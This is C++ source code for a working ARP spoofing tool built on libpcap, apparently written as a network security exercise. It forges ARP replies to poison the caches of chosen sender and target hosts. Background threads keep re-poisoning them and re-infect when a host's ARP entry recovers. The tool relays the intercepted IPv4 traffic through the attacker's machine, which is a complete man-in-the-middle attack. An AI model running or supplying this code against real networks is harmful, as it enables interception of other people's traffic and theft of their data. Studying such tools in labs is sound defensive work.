#include "pch.h"
#include <cstdio>
#include <iostream>
#include <csignal>

#include <pcap.h>
#include <pthread.h>
#include <set>
#include <map>
#include <vector>
#include <algorithm>

#include "ethhdr.h"
#include "arphdr.h"
#include "iphdr.h"

#include <unistd.h>
#include <sys/ioctl.h>
#include <linux/if.h>

#pragma pack(push, 1)
struct EthArpPacket final {
    EthHdr eth_;
    ArpHdr arp_;
};
#pragma pack(pop)

volatile bool g_running = true;

void signal_handler(int signum) {
    printf("\n[*] Caught signal %d, shutting down gracefully...\n", signum);
    g_running = false;
}

char* dev;

void print_addr(std::string label, Ip& ip, Mac& mac) {
    std::cout << "┌─────────────────────────────────┐" << std::endl;
    std::cout << "│ " << label << " Information" << std::endl;
    std::cout << "├─────────────────────────────────┤" << std::endl;
    std::cout << "│ IP  : " << std::string(ip) << std::endl;
    std::cout << "│ MAC : " << std::string(mac) << std::endl;
    std::cout << "└─────────────────────────────────┘" << std::endl;
}

Ip aip; Mac amac;
void load_addr(Ip& ip, Mac& mac){
    printf("[+] Loading attacker's network information...\n");

    int sfd = socket(AF_INET, SOCK_DGRAM, 0);
    if (sfd == -1) {
        perror("socket");
        exit(1);
    }

    struct ifreq ifr;
    strcpy(ifr.ifr_name, dev);

    // Get IP address
    if (ioctl(sfd, SIOCGIFADDR, &ifr) == -1) {
        perror("ioctl(SIOCGIFADDR)");
        close(sfd);
        exit(1);
    }
    ip = Ip(ntohl(((sockaddr_in*)&ifr.ifr_addr)->sin_addr.s_addr));

    // Get MAC address
    if (ioctl(sfd, SIOCGIFHWADDR, &ifr) == -1) {
        perror("ioctl(SIOCGIFHWADDR)");
        close(sfd);
        exit(1);
    }
    mac = Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);

    close(sfd);
    printf("[+] Network information loaded successfully\n");
}

std::map<Ip,Mac> cache;
Mac& get_mac(pcap_t* pcap, Ip& ip) {
    if (cache.find(ip) != cache.end()) {
        //printf("[CACHE] MAC for %s found in cache: %s\n",std::string(ip).c_str(), std::string(cache[ip]).c_str());
        return cache[ip];
    }

    printf("[ARP] Resolving MAC address for %s...\n", std::string(ip).c_str());

    Mac& mac = cache[ip];
    EthArpPacket packet;
    packet.eth_.dmac_ = Mac("ff:ff:ff:ff:ff:ff");
    packet.eth_.smac_ = Mac(amac);
    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);
    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::OP_REQUEST);
    packet.arp_.smac_ = Mac(amac);
    packet.arp_.sip_ = htonl(aip);
    packet.arp_.tmac_ = Mac("00:00:00:00:00:00");
    packet.arp_.tip_ = htonl(ip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[ERROR] pcap_sendpacket failed: %s\n", pcap_geterr(pcap));
    } else {
        printf("[ARP] Request sent for %s\n", std::string(ip).c_str());
    }

    // Wait for ARP reply
    int retry_count = 0;
    while(retry_count < 100) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);
        if (res == 0) {
            retry_count++;
            continue;
        }
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "[ERROR] pcap_next_ex failed: %s\n", pcap_geterr(pcap));
            break;
        }

        EthHdr* eth_hdr = (EthHdr*)packet;
        ArpHdr* arp_hdr = (ArpHdr*)(eth_hdr + 1);

        if (eth_hdr->type() == EthHdr::ETHERTYPE_ARP &&
            arp_hdr->op() == ArpHdr::OP_REPLY &&
            arp_hdr->sip() == ip) {
            mac = arp_hdr->smac();
            printf("[SUCCESS] MAC address resolved for %s: %s\n",std::string(ip).c_str(), std::string(mac).c_str());
            break;
        }
        retry_count++;
    }

    if (retry_count >= 100) {
        fprintf(stderr, "[WARNING] Timeout while resolving MAC for %s\n",std::string(ip).c_str());
    }
    return mac;
}

void poison(pcap_t* pcap, Ip& sip, Ip& tip) {
    Mac smac = get_mac(pcap, sip);

    EthArpPacket packet;
    packet.eth_.dmac_ = Mac(smac);
    packet.eth_.smac_ = Mac(amac);
    packet.eth_.type_ = htons(EthHdr::ETHERTYPE_ARP);
    packet.arp_.hrd_ = htons(ArpHdr::HTYPE_ETHER);
    packet.arp_.pro_ = htons(EthHdr::ETHERTYPE_IPV4);
    packet.arp_.hln_ = Mac::Size;
    packet.arp_.pln_ = Ip::Size;
    packet.arp_.op_ = htons(ArpHdr::OP_REPLY);
    packet.arp_.smac_ = amac;
    packet.arp_.sip_ = htonl(tip);
    packet.arp_.tmac_ = smac;
    packet.arp_.tip_ = htonl(sip);

    int res = pcap_sendpacket(pcap, reinterpret_cast<const u_char*>(&packet), sizeof(EthArpPacket));
    if (res != 0) {
        fprintf(stderr, "[ERROR] Poison packet send failed: %s\n", pcap_geterr(pcap));
    } else {
        //printf("[SPOOF] ARP poison sent: %s thinks %s is at %s\n",std::string(sip).c_str(), std::string(tip).c_str(),std::string(amac).c_str());
    }
}

struct thrArgs {
    Ip sender;
    Ip target;
};

void* infect(void* arg) {
    thrArgs* args = (thrArgs*)(arg);
    Ip sip = args->sender;
    Ip tip = args->target;
    delete args;  // Free memory

    printf("[INFECT] Thread started for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "[ERROR] Infect thread failed to open device: %s\n", errbuf);
        return nullptr;
    }

    while(g_running){
        poison(pcap, sip, tip); poison(pcap, tip, sip);
        sleep(1);
    }

    printf("[INFECT] Thread stopping for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());
    pcap_close(pcap);
    return nullptr;
}

void* attack(void* arg){
    thrArgs* args = (thrArgs*)(arg);
    Ip sip = args->sender;
    Ip tip = args->target;

    printf("[ATTACK] Thread started for %s <-> %s\n",std::string(sip).c_str(), std::string(tip).c_str());

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "[ERROR] Attack thread failed to open device: %s\n", errbuf);
        delete args;
        return nullptr;
    }

    // Create infect thread
    thrArgs* infect_args = new thrArgs;
    infect_args->sender = sip;
    infect_args->target = tip;
    pthread_t infect_thread;
    if(pthread_create(&infect_thread, nullptr, infect, (void*)infect_args) != 0) {
        fprintf(stderr, "[ERROR] Failed to create infect thread for %s <-> %s\n",
                std::string(sip).c_str(), std::string(tip).c_str());
        delete infect_args;
    } else {
        pthread_detach(infect_thread);
    }
    delete args;
    Mac smac = get_mac(pcap, sip);
    Mac tmac = get_mac(pcap, tip);
    poison(pcap, sip, tip); poison(pcap, tip, sip);
    printf("[ATTACK] Ready to relay packets between:\n");
    printf("         Sender: %s (%s)\n", std::string(sip).c_str(), std::string(smac).c_str());
    printf("         Target: %s (%s)\n", std::string(tip).c_str(), std::string(tmac).c_str());

    int relay_count = 0;
    int reinfect_count = 0;

    while (g_running) {
        struct pcap_pkthdr* header;
        const u_char* packet;
        int res = pcap_next_ex(pcap, &header, &packet);

        if (!g_running) break;

        if (res == 0) continue;  // Timeout
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            fprintf(stderr, "[ERROR] pcap_next_ex failed: %s\n", pcap_geterr(pcap));
            break;
        }

        EthHdr* eth_hdr = (EthHdr*)packet;
        // IP Packet Relay
        if (eth_hdr->type() == EthHdr::ETHERTYPE_IPV4) {
            IpHdr* ip_hdr = (IpHdr*)(eth_hdr + 1);
            if (ip_hdr->sip() == aip || ip_hdr->dip() == aip) continue;
            if (ip_hdr->sip() == sip || ip_hdr->dip() == tip) {
                eth_hdr->smac_ = amac;
                eth_hdr->dmac_ = tmac;
                res = pcap_sendpacket(pcap, packet, header->caplen);
                if (res != 0) {
                    fprintf(stderr, "[ERROR] Failed to relay packet: %s\n", pcap_geterr(pcap));
                } else {
                    relay_count++;
                    printf("[RELAY] Packet #%d: %s -> %s (size: %u)\n", relay_count, std::string(ip_hdr->sip()).c_str(),std::string(ip_hdr->dip()).c_str(), header->caplen);
                }
            }
            if (ip_hdr->sip() == tip || ip_hdr->dip() == sip) {
                eth_hdr->smac_ = amac;
                eth_hdr->dmac_ = smac;
                res = pcap_sendpacket(pcap, packet, header->caplen);
                if (res != 0) {
                    fprintf(stderr, "[ERROR] Failed to relay packet: %s\n", pcap_geterr(pcap));
                } else {
                    relay_count++;
                    printf("[RELAY] Packet #%d: %s <- %s (size: %u)\n", relay_count, std::string(ip_hdr->sip()).c_str(),std::string(ip_hdr->dip()).c_str(), header->caplen);
                }
            }
        }
        // ARP Packet Block & Reinfect
        // Case 1 : ARP Request from sip(smac) to tip(amac) -> Reply
        // Case 2 : ARP Request from sip(smac) to tip(broadcast) -> Reinfect
        // Case 3 : ARP Request from tip(tmac) to sip(amac) -> Reply
        // Case 4 : ARP Request from tip(tmac) to sip(broadcast) -> Reinfect
        // Case 5 : Any ARP Packet with Valid Source IP, Source MAC Pair Information
        //1 U 2 U 3 U 4 ( 5
        if (eth_hdr->type() == EthHdr::ETHERTYPE_ARP) {
            ArpHdr* arp_hdr = (ArpHdr*)(eth_hdr + 1);
            if (arp_hdr->sip() == sip && arp_hdr->smac() == smac || arp_hdr->sip() == tip && arp_hdr->smac() == tmac) {
                reinfect_count++;
                printf("[ARP] Recovery detected! Reinfecting... (count: %d)\n", reinfect_count);
                poison(pcap, sip, tip); poison(pcap,tip,sip);
            }
        }

    }

    printf("[ATTACK] Thread stopping for %s -> %s\n", std::string(sip).c_str(), std::string(tip).c_str());
    printf("[STATS] Total packets relayed: %d, ARP reinfections: %d\n",relay_count, reinfect_count);

    pcap_close(pcap);
    return nullptr;
}

void restore();

void usage() {
    printf("syntax : arp-spoof <interface> <sender ip 1> <target ip 1> [<sender ip 2> <target ip 2>...]\n");
    printf("sample : arp-spoof wlan0 192.168.10.2 192.168.10.1 192.168.10.1 192.168.10.2\n");
}

int main(int argc, char* argv[]) {
    if (argc < 4 || argc % 2 != 0) {
        usage();
        return EXIT_FAILURE;
    }

    // Register signal handlers
    std::signal(SIGINT, signal_handler);
    std::signal(SIGKILL, signal_handler);
    std::signal(SIGTERM, signal_handler);
    printf("[*] Signal handlers registered (Ctrl+C to stop)\n");

    dev = argv[1];
    printf("[*] Using interface: %s\n", dev);

    // Load attacker's network information
    load_addr(aip, amac);
    print_addr("Attacker", aip, amac);

    std::vector<pthread_t> threads;
    std::set<std::pair<Ip,Ip>> flow;

    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
    if (pcap == nullptr) {
        fprintf(stderr, "failed to open device: %s\n", errbuf);
        return 1;
    }

    printf("\n[*] Scaning Mac...\n");
    for(int i = 2; i < argc; i++) {
        Ip ip = Ip(argv[i]);
        get_mac(pcap,ip);
    }

    for(int i = 2; i < argc; i += 2) {
        Ip sender_ip = Ip(argv[i]); Ip target_ip = Ip(argv[i+1]);
        if(sender_ip > target_ip) std::swap(sender_ip, target_ip);
        if(flow.find({sender_ip,target_ip}) != flow.end()) continue;
        printf("[*] Processing pair: %s <-> %s\n",std::string(sender_ip).c_str(), std::string(target_ip).c_str());
        flow.insert({sender_ip,target_ip});

        thrArgs* args = new thrArgs;
        args->sender = sender_ip;
        args->target = target_ip;
        pthread_t thread;
        if(pthread_create(&thread, nullptr, attack, args) != 0) {
            fprintf(stderr, "[ERROR] Failed to create attack thread\n");
            delete args;
            continue;
        }
        threads.push_back(thread);
    }

    // Wait for all threads to complete
    for(pthread_t& thread : threads) {
        pthread_join(thread, nullptr);
    }

    printf("\n[*] All threads have terminated\n");
    printf("\n[*] Cleanup complete. Exiting...\n");
    printf("═══════════════════════════════════════\n\n");

    return 0;
}